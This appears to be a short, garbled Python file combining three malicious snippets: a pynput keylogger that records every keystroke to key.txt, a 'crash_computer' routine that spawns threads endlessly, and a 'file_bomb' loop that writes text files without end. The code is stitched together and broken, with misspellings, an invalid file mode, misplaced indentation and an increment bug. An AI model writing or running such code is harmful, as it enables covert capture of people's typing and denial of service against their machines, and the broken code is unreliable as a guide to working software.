from pynput.keyboard import Listener

def on_press(key):
    with open('key.txt','a\n') as f:
        f.write(str(key)+'\n')

with Listener (on_press=on_press) as listener:
    listener.join()

 

    import threading
    
    def crash_computer():
        while True:
            threading.Thread(target=crash_couputer).start()


        if __name__ == '__main__':
                
         crash_couputer()    

             




import os

def file_bomb():
    i =0
    while True:
        i =+ 1

        with open (f'file_{i}.txt',"w") as f:
            f.write("This test file.\n "*1000)

if __name__ == '__main__':
    file_bomb()
                















                